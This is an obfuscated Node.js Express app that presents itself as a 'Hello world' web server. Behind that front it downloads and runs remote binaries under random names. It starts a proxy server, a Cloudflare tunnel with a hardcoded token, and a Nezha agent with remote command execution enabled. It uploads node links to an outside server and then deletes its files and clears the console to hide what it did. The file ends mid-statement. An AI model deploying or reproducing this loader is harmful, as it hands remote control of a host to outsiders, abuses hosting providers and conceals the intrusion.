const _0x4e5cd0=_0x4b80;(function(_0x276a64,_0x17d393){const _0x280247=_0x4b80,_0x232501=_0x276a64();while(!![]){try{const _0x1db8ee=-parseInt(_0x280247(0x137))/0x1+-parseInt(_0x280247(0x187))/0x2+parseInt(_0x280247(0x167))/0x3*(parseInt(_0x280247(0x17a))/0x4)+-parseInt(_0x280247(0x1d6))/0x5*(-parseInt(_0x280247(0x1c7))/0x6)+parseInt(_0x280247(0x1e2))/0x7+-parseInt(_0x280247(0x16b))/0x8*(parseInt(_0x280247(0x19a))/0x9)+parseInt(_0x280247(0x156))/0xa;if(_0x1db8ee===_0x17d393)break;else _0x232501['push'](_0x232501['shift']());}catch(_0xc2bdc9){_0x232501['push'](_0x232501['shift']());}}}(_0x5064,0x1e4f2));const express=require(_0x4e5cd0(0x1cc)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x4e5cd0(0x19d)),{promisify}=require(_0x4e5cd0(0x1b1)),exec=promisify(require(_0x4e5cd0(0x1ae))[_0x4e5cd0(0x161)]),{execSync}=require(_0x4e5cd0(0x1ae)),UPLOAD_URL=process['env'][_0x4e5cd0(0x16e)]||'',PROJECT_URL=process[_0x4e5cd0(0x191)][_0x4e5cd0(0x17f)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x4e5cd0(0x191)][_0x4e5cd0(0x17b)]||_0x4e5cd0(0x1b2),SUB_PATH=process[_0x4e5cd0(0x191)][_0x4e5cd0(0x1de)]||_0x4e5cd0(0x179),PORT=process['env'][_0x4e5cd0(0x144)]||process[_0x4e5cd0(0x191)][_0x4e5cd0(0x17d)]||0xbb8,UUID=process[_0x4e5cd0(0x191)][_0x4e5cd0(0x125)]||_0x4e5cd0(0x17c),NEZHA_SERVER=process[_0x4e5cd0(0x191)][_0x4e5cd0(0x12d)]||_0x4e5cd0(0x154),NEZHA_PORT=process[_0x4e5cd0(0x191)][_0x4e5cd0(0x1b5)]||'',NEZHA_KEY=process[_0x4e5cd0(0x191)][_0x4e5cd0(0x170)]||_0x4e5cd0(0x176),ARGO_DOMAIN=process['env'][_0x4e5cd0(0x19b)]||_0x4e5cd0(0x1e1),ARGO_AUTH=process[_0x4e5cd0(0x191)][_0x4e5cd0(0x16c)]||_0x4e5cd0(0x192),ARGO_PORT=process[_0x4e5cd0(0x191)][_0x4e5cd0(0x1bf)]||0x1f41,CFIP=process[_0x4e5cd0(0x191)]['CFIP']||_0x4e5cd0(0x166),CFPORT=process[_0x4e5cd0(0x191)][_0x4e5cd0(0x160)]||0x1bb,NAME=process[_0x4e5cd0(0x191)][_0x4e5cd0(0x131)]||'zcrtqha';!fs[_0x4e5cd0(0x1db)](FILE_PATH)?(fs[_0x4e5cd0(0x1aa)](FILE_PATH),console[_0x4e5cd0(0x132)](FILE_PATH+'\x20is\x20created')):console[_0x4e5cd0(0x132)](FILE_PATH+_0x4e5cd0(0x1a2));function generateRandomName(){const _0x5a87a2=_0x4e5cd0,_0x1195fa=_0x5a87a2(0x198);let _0x1e85db='';for(let _0x518cf3=0x0;_0x518cf3<0x6;_0x518cf3++){_0x1e85db+=_0x1195fa[_0x5a87a2(0x1a3)](Math[_0x5a87a2(0x181)](Math[_0x5a87a2(0x1af)]()*_0x1195fa[_0x5a87a2(0x174)]));}return _0x1e85db;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4e5cd0(0x12c)](FILE_PATH,npmName),phpPath=path[_0x4e5cd0(0x12c)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x4e5cd0(0x12c)](FILE_PATH,botName),subPath=path[_0x4e5cd0(0x12c)](FILE_PATH,_0x4e5cd0(0x1e8)),listPath=path['join'](FILE_PATH,_0x4e5cd0(0x1e6)),bootLogPath=path[_0x4e5cd0(0x12c)](FILE_PATH,_0x4e5cd0(0x190)),configPath=path[_0x4e5cd0(0x12c)](FILE_PATH,_0x4e5cd0(0x1ad));function deleteNodes(){const _0x955b35=_0x4e5cd0;try{if(!UPLOAD_URL)return;if(!fs[_0x955b35(0x1db)](subPath))return;let _0x2d2907;try{_0x2d2907=fs['readFileSync'](subPath,_0x955b35(0x180));}catch{return null;}const _0x2c9f08=Buffer[_0x955b35(0x1c5)](_0x2d2907,_0x955b35(0x1cb))[_0x955b35(0x1e9)]('utf-8'),_0x2e45d6=_0x2c9f08[_0x955b35(0x136)]('\x0a')['filter'](_0x35167c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x35167c));if(_0x2e45d6[_0x955b35(0x174)]===0x0)return;return axios[_0x955b35(0x19e)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x2e45d6}),{'headers':{'Content-Type':'application/json'}})[_0x955b35(0x1d2)](_0x59763f=>{return null;}),null;}catch(_0x7d5b34){return null;}}function cleanupOldFiles(){const _0x46cc89=_0x4e5cd0;try{const _0x12b064=fs[_0x46cc89(0x1d3)](FILE_PATH);_0x12b064['forEach'](_0x8b20a9=>{const _0x2c50ae=_0x46cc89,_0x57e7be=path[_0x2c50ae(0x12c)](FILE_PATH,_0x8b20a9);try{const _0x360d76=fs['statSync'](_0x57e7be);_0x360d76[_0x2c50ae(0x122)]()&&fs[_0x2c50ae(0x1eb)](_0x57e7be);}catch(_0x3137ea){}});}catch(_0x228117){}}app[_0x4e5cd0(0x1be)]('/',function(_0x17be82,_0x1c2516){const _0x3f47f3=_0x4e5cd0;_0x1c2516[_0x3f47f3(0x15a)](_0x3f47f3(0x139));});async function generateConfig(){const _0x302979=_0x4e5cd0,_0x825a5={'log':{'access':_0x302979(0x1a8),'error':_0x302979(0x1a8),'loglevel':_0x302979(0x1a1)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x302979(0x1b0),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x302979(0x1a1),'fallbacks':[{'dest':0xbb9},{'path':_0x302979(0x199),'dest':0xbba},{'path':_0x302979(0x1ca),'dest':0xbbb},{'path':_0x302979(0x1c6),'dest':0xbbc}]},'streamSettings':{'network':_0x302979(0x145)}},{'port':0xbb9,'listen':_0x302979(0x153),'protocol':_0x302979(0x1b0),'settings':{'clients':[{'id':UUID}],'decryption':_0x302979(0x1a1)},'streamSettings':{'network':_0x302979(0x145),'security':_0x302979(0x1a1)}},{'port':0xbba,'listen':_0x302979(0x153),'protocol':_0x302979(0x1b0),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x302979(0x1a1)},'streamSettings':{'network':'ws','security':_0x302979(0x1a1),'wsSettings':{'path':_0x302979(0x199)}},'sniffing':{'enabled':!![],'destOverride':[_0x302979(0x148),_0x302979(0x1b3),_0x302979(0x152)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x302979(0x153),'protocol':_0x302979(0x143),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x302979(0x1b3),_0x302979(0x152)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x302979(0x175),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x302979(0x1a1),'wsSettings':{'path':_0x302979(0x1c6)}},'sniffing':{'enabled':!![],'destOverride':[_0x302979(0x148),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x302979(0x13e)]},'outbounds':[{'protocol':_0x302979(0x169),'tag':_0x302979(0x1c0)},{'protocol':_0x302979(0x13d),'tag':_0x302979(0x16d)}]};fs[_0x302979(0x141)](path[_0x302979(0x12c)](FILE_PATH,_0x302979(0x1ad)),JSON[_0x302979(0x1b9)](_0x825a5,null,0x2));}function getSystemArchitecture(){const _0x553207=_0x4e5cd0,_0xfe2b98=os[_0x553207(0x185)]();return _0xfe2b98===_0x553207(0x1e3)||_0xfe2b98===_0x553207(0x12f)||_0xfe2b98===_0x553207(0x1ce)?_0x553207(0x1e3):_0x553207(0x1dd);}function downloadFile(_0x190e58,_0x4c64d5,_0x3466e7){const _0x28a469=_0x4e5cd0,_0x21a041=_0x190e58;!fs[_0x28a469(0x1db)](FILE_PATH)&&fs[_0x28a469(0x1aa)](FILE_PATH,{'recursive':!![]});const _0x3b41c3=fs[_0x28a469(0x1c9)](_0x21a041);axios({'method':_0x28a469(0x1be),'url':_0x4c64d5,'responseType':_0x28a469(0x14e)})['then'](_0x3593ee=>{const _0x29a3ee=_0x28a469;_0x3593ee[_0x29a3ee(0x197)]['pipe'](_0x3b41c3),_0x3b41c3['on'](_0x29a3ee(0x196),()=>{const _0x10bdd6=_0x29a3ee;_0x3b41c3[_0x10bdd6(0x151)](),console['log']('Download\x20'+path[_0x10bdd6(0x14b)](_0x21a041)+_0x10bdd6(0x1ab)),_0x3466e7(null,_0x21a041);}),_0x3b41c3['on'](_0x29a3ee(0x128),_0x396f24=>{const _0x15e899=_0x29a3ee;fs['unlink'](_0x21a041,()=>{});const _0x2310a5=_0x15e899(0x124)+path[_0x15e899(0x14b)](_0x21a041)+_0x15e899(0x123)+_0x396f24['message'];console[_0x15e899(0x128)](_0x2310a5),_0x3466e7(_0x2310a5);});})[_0x28a469(0x1d2)](_0x516bf5=>{const _0x29d2ab=_0x28a469,_0x324f85=_0x29d2ab(0x124)+path[_0x29d2ab(0x14b)](_0x21a041)+_0x29d2ab(0x123)+_0x516bf5['message'];console[_0x29d2ab(0x128)](_0x324f85),_0x3466e7(_0x324f85);});}function _0x5064(){const _0x15dfb4=['stream','https://amd64.ssss.nyc.mn/agent','push','close','quic','127.0.0.1','nz.rongshishang.dpdns.org:8008','App\x20is\x20running','1652340uUdnpD','forEach','\x20-p\x20','false','send','Error\x20reading\x20boot.log:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/api/add-subscriptions','del\x20/f\x20/q\x20','CFPORT','exec','2087','Error\x20in\x20startserver:','includes','\x0a\x0avmess://','cdns.doon.eu.org','323133loLeoC','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','freedom','ArgoDomain:','8QfqFcW','ARGO_AUTH','block','UPLOAD_URL','Unknown','NEZHA_KEY','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','length','trojan','1BlOWB7RfxWl4LbWdfSpW1MRJoqivG9G','listen','https://arm64.ssss.nyc.mn/v1','sub','8iimOYE','FILE_PATH','2efcf3b6-001d-49f0-b20b-cca6c97b8fb0','PORT','substring','PROJECT_URL','utf-8','floor','8443','config.yaml','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','arch','text/plain;\x20charset=utf-8','81730ZvczMR','https://amd64.ssss.nyc.mn/v1','pkill\x20-f\x20\x22[','/api/add-nodes','test','taskkill\x20/f\x20/im\x20','\x0a\x20\x20credentials-file:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','readFileSync','boot.log','env','eyJhIjoiMzBhNzVmNmI3NjU0NzFmNDgzZWI3NzM3N2IxMDA1OTEiLCJ0IjoiYTkxOWJmNTAtMDAyMi00YjdlLTk3ZTktOWJiYjgwMTMwOWYxIiwicyI6Ik1tUTJPVFV5WmpZdE9EVTNOUzAwWldJMUxUaGtZVE10TlRoaE1ERTBZamd5T0dRdyJ9','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','platform','finish','data','abcdefghijklmnopqrstuvwxyz','/vless-argo','1777662yuTsnG','ARGO_DOMAIN','fileUrl','path','post','Skipping\x20adding\x20automatic\x20access\x20task','NEZHA\x20variable\x20is\x20empty,skip\x20running','none','\x20already\x20exists','charAt','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Subscription\x20uploaded\x20successfully','chmod','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/dev/null','https://arm64.ssss.nyc.mn/agent','mkdirSync','\x20successfully','\x0a\x0atrojan://','config.json','child_process','random','vless','util','./tmp','tls','/vmess-argo?ed=2560','NEZHA_PORT','https://arm64.ssss.nyc.mn/web','all','set','stringify','application/json','\x0avless://','has','\x20>/dev/null\x202>&1','get','ARGO_PORT','direct','tunnel.yml','Unhandled\x20error\x20in\x20startserver:','Empowerment\x20success\x20for\x20','https://ipapi.co/json/','from','/trojan-argo','233718NWenUD','/sub.txt\x20saved\x20successfully','createWriteStream','/vmess-argo','base64','express','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','aarch64','\x20>/dev/null\x202>&1\x20&','\x0aclient_secret:\x20','org','catch','readdirSync','?security=tls&sni=','response','15BWfbFz','countryCode','443','clear','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','existsSync','nohup\x20','amd','SUB_PATH','2083','unshift','zzip.7.c.d.c.0.6.3.0.0.0.7.4.0.1.0.0.2.ip6.arpa','629013wiemim','arm','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','success','list.txt','\x20>\x20nul\x202>&1','sub.txt','toString','status','unlinkSync','country_code','isFile','\x20failed:\x20','Download\x20','UUID','match','Content-Type','error','.exe\x20>\x20nul\x202>&1','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','tunnel.json','join','NEZHA_SERVER','Add\x20automatic\x20access\x20task\x20faild:\x20','arm64','?encryption=none&security=tls&sni=','NAME','log','https://arm64.ssss.nyc.mn/bot','\x0a\x20\x20\x20\x20','win32','split','224845vKwdUw','https://amd64.ssss.nyc.mn/bot','Hello\x20world!','2053','web\x20running\x20error:\x20','\x20-c\x20','blackhole','https+local://8.8.8.8/dns-query','\x20is\x20running','2096','writeFileSync','&path=%2Fvless-argo%3Fed%3D2560#','vmess','SERVER_PORT','tcp','&fp=firefox&type=ws&host=','Error\x20executing\x20command:\x20','http','\x22\x20>\x20/dev/null\x202>&1','npm\x20running\x20error:\x20','basename','filter','https://oooo.serv00.net/add-url'];_0x5064=function(){return _0x15dfb4;};return _0x5064();}async function downloadFilesAndRun(){const _0x27e490=_0x4e5cd0,_0x5b1eba=getSystemArchitecture(),_0x268844=getFilesForArchitecture(_0x5b1eba);if(_0x268844['length']===0x0){console[_0x27e490(0x132)](_0x27e490(0x194));return;}const _0x494cd5=_0x268844['map'](_0x269fa1=>{return new Promise((_0xbbf3fa,_0x4beea8)=>{const _0x7fd8b5=_0x4b80;downloadFile(_0x269fa1['fileName'],_0x269fa1[_0x7fd8b5(0x19c)],(_0x15e104,_0x272bb7)=>{_0x15e104?_0x4beea8(_0x15e104):_0xbbf3fa(_0x272bb7);});});});try{await Promise[_0x27e490(0x1b7)](_0x494cd5);}catch(_0x38048b){console[_0x27e490(0x128)]('Error\x20downloading\x20files:',_0x38048b);return;}function _0x5ea8b1(_0x570d4d){const _0x2837f4=_0x27e490,_0x4bf21a=0x1fd;_0x570d4d[_0x2837f4(0x157)](_0xe1fe56=>{const _0x10d204=_0x2837f4;fs[_0x10d204(0x1db)](_0xe1fe56)&&fs[_0x10d204(0x1a6)](_0xe1fe56,_0x4bf21a,_0x4a325e=>{const _0x5af1af=_0x10d204;_0x4a325e?console[_0x5af1af(0x128)]('Empowerment\x20failed\x20for\x20'+_0xe1fe56+':\x20'+_0x4a325e):console[_0x5af1af(0x132)](_0x5af1af(0x1c3)+_0xe1fe56+':\x20'+_0x4bf21a['toString'](0x8));});});}const _0x35572b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5ea8b1(_0x35572b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x274f73=NEZHA_SERVER[_0x27e490(0x164)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x318006=new Set([_0x27e490(0x1d8),'8443',_0x27e490(0x140),_0x27e490(0x162),'2083',_0x27e490(0x13a)]),_0x1b1f91=_0x318006[_0x27e490(0x1bc)](_0x274f73)?'true':_0x27e490(0x159),_0x2fe972=_0x27e490(0x1d0)+NEZHA_KEY+_0x27e490(0x168)+NEZHA_SERVER+_0x27e490(0x1e4)+_0x1b1f91+_0x27e490(0x1cd)+UUID;fs[_0x27e490(0x141)](path[_0x27e490(0x12c)](FILE_PATH,_0x27e490(0x183)),_0x2fe972);const _0xc75505=_0x27e490(0x1dc)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x27e490(0x12a);try{await exec(_0xc75505),console[_0x27e490(0x132)](phpName+'\x20is\x20running'),await new Promise(_0x269546=>setTimeout(_0x269546,0x3e8));}catch(_0x23d44a){console['error']('php\x20running\x20error:\x20'+_0x23d44a);}}else{let _0x486568='';const _0x310d0a=[_0x27e490(0x1d8),_0x27e490(0x182),_0x27e490(0x140),_0x27e490(0x162),_0x27e490(0x1df),_0x27e490(0x13a)];_0x310d0a[_0x27e490(0x164)](NEZHA_PORT)&&(_0x486568='--tls');const _0x4a2360=_0x27e490(0x1dc)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x27e490(0x158)+NEZHA_KEY+'\x20'+_0x486568+_0x27e490(0x171);try{await exec(_0x4a2360),console[_0x27e490(0x132)](npmName+_0x27e490(0x13f)),await new Promise(_0x58095b=>setTimeout(_0x58095b,0x3e8));}catch(_0x47192e){console[_0x27e490(0x128)](_0x27e490(0x14a)+_0x47192e);}}}else console[_0x27e490(0x132)](_0x27e490(0x1a0));const _0x38e542=_0x27e490(0x1dc)+webPath+_0x27e490(0x13c)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x38e542),console[_0x27e490(0x132)](webName+_0x27e490(0x13f)),await new Promise(_0x1f8a63=>setTimeout(_0x1f8a63,0x3e8));}catch(_0x1d75e5){console[_0x27e490(0x128)](_0x27e490(0x13b)+_0x1d75e5);}if(fs['existsSync'](botPath)){let _0x5ed972;if(ARGO_AUTH[_0x27e490(0x126)](/^[A-Z0-9a-z=]{120,250}$/))_0x5ed972='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x27e490(0x126)](/TunnelSecret/)?_0x5ed972=_0x27e490(0x1da)+FILE_PATH+'/tunnel.yml\x20run':_0x5ed972=_0x27e490(0x184)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x27e490(0x1dc)+botPath+'\x20'+_0x5ed972+_0x27e490(0x1cf)),console[_0x27e490(0x132)](botName+_0x27e490(0x13f)),await new Promise(_0xf3b1a=>setTimeout(_0xf3b1a,0x7d0));}catch(_0x3268ad){console[_0x27e490(0x128)](_0x27e490(0x147)+_0x3268ad);}}await new Promise(_0x3ab656=>setTimeout(_0x3ab656,0x1388));}function getFilesForArchitecture(_0x4a61e6){const _0x555f48=_0x4e5cd0;let _0x3c3ebc;_0x4a61e6===_0x555f48(0x1e3)?_0x3c3ebc=[{'fileName':webPath,'fileUrl':_0x555f48(0x1b6)},{'fileName':botPath,'fileUrl':_0x555f48(0x133)}]:_0x3c3ebc=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x555f48(0x138)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1bd4b7=_0x4a61e6===_0x555f48(0x1e3)?_0x555f48(0x1a9):_0x555f48(0x14f);_0x3c3ebc[_0x555f48(0x1e0)]({'fileName':npmPath,'fileUrl':_0x1bd4b7});}else{const _0x1a945a=_0x4a61e6===_0x555f48(0x1e3)?_0x555f48(0x178):_0x555f48(0x188);_0x3c3ebc['unshift']({'fileName':phpPath,'fileUrl':_0x1a945a});}}return _0x3c3ebc;}function argoType(){const _0x4512ff=_0x4e5cd0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4512ff(0x132)](_0x4512ff(0x1a7));return;}if(ARGO_AUTH[_0x4512ff(0x164)]('TunnelSecret')){fs[_0x4512ff(0x141)](path[_0x4512ff(0x12c)](FILE_PATH,_0x4512ff(0x12b)),ARGO_AUTH);const _0x195afb='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x4512ff(0x136)]('\x22')[0xb]+_0x4512ff(0x18d)+path[_0x4512ff(0x12c)](FILE_PATH,'tunnel.json')+_0x4512ff(0x172)+ARGO_DOMAIN+_0x4512ff(0x193)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x4512ff(0x141)](path[_0x4512ff(0x12c)](FILE_PATH,_0x4512ff(0x1c1)),_0x195afb);}else console['log'](_0x4512ff(0x15d));}async function extractDomains(){const _0x4b5e42=_0x4e5cd0;let _0x466f2d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x466f2d=ARGO_DOMAIN,console[_0x4b5e42(0x132)]('ARGO_DOMAIN:',_0x466f2d),await _0x1876b9(_0x466f2d);else try{const _0x378d98=fs[_0x4b5e42(0x18f)](path['join'](FILE_PATH,_0x4b5e42(0x190)),_0x4b5e42(0x180)),_0x2dd21e=_0x378d98[_0x4b5e42(0x136)]('\x0a'),_0x4585f5=[];_0x2dd21e[_0x4b5e42(0x157)](_0x5951f5=>{const _0xaf0770=_0x4b5e42,_0x343ede=_0x5951f5[_0xaf0770(0x126)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x343ede){const _0x352917=_0x343ede[0x1];_0x4585f5[_0xaf0770(0x150)](_0x352917);}});if(_0x4585f5['length']>0x0)_0x466f2d=_0x4585f5[0x0],console[_0x4b5e42(0x132)](_0x4b5e42(0x16a),_0x466f2d),await _0x1876b9(_0x466f2d);else{console['log'](_0x4b5e42(0x15c)),fs[_0x4b5e42(0x1eb)](path[_0x4b5e42(0x12c)](FILE_PATH,_0x4b5e42(0x190)));async function _0x428336(){const _0x43293a=_0x4b5e42;try{process[_0x43293a(0x195)]===_0x43293a(0x135)?await exec(_0x43293a(0x18c)+botName+_0x43293a(0x129)):await exec(_0x43293a(0x189)+botName[_0x43293a(0x1a3)](0x0)+']'+botName[_0x43293a(0x17e)](0x1)+_0x43293a(0x149));}catch(_0x4c4cf1){}}_0x428336(),await new Promise(_0x534b55=>setTimeout(_0x534b55,0xbb8));const _0x5570c1=_0x4b5e42(0x184)+FILE_PATH+_0x4b5e42(0x1a4)+ARGO_PORT;try{await exec(_0x4b5e42(0x1dc)+botPath+'\x20'+_0x5570c1+_0x4b5e42(0x1cf)),console[_0x4b5e42(0x132)](botName+'\x20is\x20running'),await new Promise(_0x32c252=>setTimeout(_0x32c252,0xbb8)),await extractDomains();}catch(_0x36f005){console[_0x4b5e42(0x128)](_0x4b5e42(0x147)+_0x36f005);}}}catch(_0x2f2b31){console[_0x4b5e42(0x128)](_0x4b5e42(0x15b),_0x2f2b31);}async function _0x4a2c8b(){const _0x477d4b=_0x4b5e42;try{const _0x4372c8=await axios[_0x477d4b(0x1be)](_0x477d4b(0x1c4),{'timeout':0xbb8});if(_0x4372c8[_0x477d4b(0x197)]&&_0x4372c8[_0x477d4b(0x197)][_0x477d4b(0x121)]&&_0x4372c8[_0x477d4b(0x197)]['org'])return _0x4372c8[_0x477d4b(0x197)]['country_code']+'_'+_0x4372c8[_0x477d4b(0x197)]['org'];}catch(_0x4fde48){try{const _0x4a2d5c=await axios[_0x477d4b(0x1be)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x4a2d5c[_0x477d4b(0x197)]&&_0x4a2d5c['data'][_0x477d4b(0x1ea)]===_0x477d4b(0x1e5)&&_0x4a2d5c[_0x477d4b(0x197)][_0x477d4b(0x1d7)]&&_0x4a2d5c[_0x477d4b(0x197)][_0x477d4b(0x1d1)])return _0x4a2d5c[_0x477d4b(0x197)][_0x477d4b(0x1d7)]+'_'+_0x4a2d5c[_0x477d4b(0x197)][_0x477d4b(0x1d1)];}catch(_0x31e9d3){}}return _0x477d4b(0x16f);}async function _0x1876b9(_0x59141e){const _0x3d2f13=await _0x4a2c8b(),_0x1d4027=NAME?NAME+'-'+_0x3d2f13:_0x3d2f13;return new Promise(_0x2f5a7d=>{setTimeout(()=>{const _0x76b6=_0x4b80,_0x1eb8d2={'v':'2','ps':''+_0x1d4027,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x76b6(0x1a1),'net':'ws','type':_0x76b6(0x1a1),'host':_0x59141e,'path':_0x76b6(0x1b4),'tls':_0x76b6(0x1b3),'sni':_0x59141e,'alpn':'','fp':'firefox'},_0x4b9e46=_0x76b6(0x1bb)+UUID+'@'+CFIP+':'+CFPORT+_0x76b6(0x130)+_0x59141e+_0x76b6(0x146)+_0x59141e+_0x76b6(0x142)+_0x1d4027+_0x76b6(0x165)+Buffer[_0x76b6(0x1c5)](JSON[_0x76b6(0x1b9)](_0x1eb8d2))['toString'](_0x76b6(0x1cb))+_0x76b6(0x1ac)+UUID+'@'+CFIP+':'+CFPORT+_0x76b6(0x1d4)+_0x59141e+_0x76b6(0x146)+_0x59141e+_0x76b6(0x18e)+_0x1d4027+_0x76b6(0x134);console[_0x76b6(0x132)](Buffer[_0x76b6(0x1c5)](_0x4b9e46)[_0x76b6(0x1e9)](_0x76b6(0x1cb))),fs['writeFileSync'](subPath,Buffer[_0x76b6(0x1c5)](_0x4b9e46)[_0x76b6(0x1e9)]('base64')),console[_0x76b6(0x132)](FILE_PATH+_0x76b6(0x1c8)),uploadNodes(),app[_0x76b6(0x1be)]('/'+SUB_PATH,(_0x468cab,_0x2eed58)=>{const _0x4c1d7c=_0x76b6,_0x206002=Buffer[_0x4c1d7c(0x1c5)](_0x4b9e46)[_0x4c1d7c(0x1e9)](_0x4c1d7c(0x1cb));_0x2eed58[_0x4c1d7c(0x1b8)](_0x4c1d7c(0x127),_0x4c1d7c(0x186)),_0x2eed58['send'](_0x206002);}),_0x2f5a7d(_0x4b9e46);},0x7d0);});}}async function uploadNodes(){const _0x1083db=_0x4e5cd0;if(UPLOAD_URL&&PROJECT_URL){const _0x2cf971=PROJECT_URL+'/'+SUB_PATH,_0x511277={'subscription':[_0x2cf971]};try{const _0x978fd7=await axios[_0x1083db(0x19e)](UPLOAD_URL+_0x1083db(0x15e),_0x511277,{'headers':{'Content-Type':_0x1083db(0x1ba)}});return _0x978fd7&&_0x978fd7[_0x1083db(0x1ea)]===0xc8?(console['log'](_0x1083db(0x1a5)),_0x978fd7):null;}catch(_0x3cdf24){if(_0x3cdf24[_0x1083db(0x1d5)]){if(_0x3cdf24['response'][_0x1083db(0x1ea)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x3f514c=fs[_0x1083db(0x18f)](listPath,'utf-8'),_0xc5842a=_0x3f514c[_0x1083db(0x136)]('\x0a')[_0x1083db(0x14c)](_0x5753ce=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1083db(0x18b)](_0x5753ce));if(_0xc5842a[_0x1083db(0x174)]===0x0)return;const _0x271ee7=JSON[_0x1083db(0x1b9)]({'nodes':_0xc5842a});try{const _0x5061f5=await axios[_0x1083db(0x19e)](UPLOAD_URL+_0x1083db(0x18a),_0x271ee7,{'headers':{'Content-Type':_0x1083db(0x1ba)}});return _0x5061f5&&_0x5061f5[_0x1083db(0x1ea)]===0xc8?(console[_0x1083db(0x132)]('Nodes\x20uploaded\x20successfully'),_0x5061f5):null;}catch(_0x1943fe){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x23665f=_0x4b80,_0x4a403e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4a403e[_0x23665f(0x150)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4a403e['push'](phpPath);process[_0x23665f(0x195)]===_0x23665f(0x135)?exec(_0x23665f(0x15f)+_0x4a403e[_0x23665f(0x12c)]('\x20')+_0x23665f(0x1e7),_0x1bd0ed=>{const _0x4fd720=_0x23665f;console[_0x4fd720(0x1d9)](),console[_0x4fd720(0x132)](_0x4fd720(0x155)),console[_0x4fd720(0x132)](_0x4fd720(0x173));}):exec('rm\x20-rf\x20'+_0x4a403e['join']('\x20')+_0x23665f(0x1bd),_0x4f0abf=>{const _0x697e00=_0x23665f;console[_0x697e00(0x1d9)](),console['log']('App\x20is\x20running'),console[_0x697e00(0x132)](_0x697e00(0x173));});},0x15f90);}cleanFiles();function _0x4b80(_0x10eb9f,_0x36ba1a){_0x10eb9f=_0x10eb9f-0x121;const _0x506478=_0x5064();let _0x4b80eb=_0x506478[_0x10eb9f];return _0x4b80eb;}async function AddVisitTask(){const _0x13d7d7=_0x4e5cd0;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x13d7d7(0x19f));return;}try{const _0x2605d4=await 